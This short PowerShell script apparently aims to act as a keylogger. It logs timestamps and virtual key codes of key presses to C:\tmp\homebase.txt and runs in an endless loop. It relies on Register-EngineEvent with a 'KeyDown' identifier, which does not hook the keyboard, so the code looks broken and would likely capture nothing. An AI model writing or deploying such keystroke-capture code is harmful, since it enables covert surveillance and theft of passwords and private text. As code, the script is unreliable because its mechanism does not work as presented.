# Create log file 
$logFile = "C:\tmp\homebase.txt"

# Script block for the key press event 
$keyDown = {
  $key = $_.VirtualKeyCode
  $date = Get-Date -Format "hh:mm:ss tt"
  Add-Content -Path $logFile -Value "$date - Key down: $key"
}

# Register the event handler
Register-EngineEvent -SourceIdentifier KeyDown -Action $keyDown 

# Keep running to continue logging
while ($true) {
  Start-Sleep -Milliseconds 100  
}

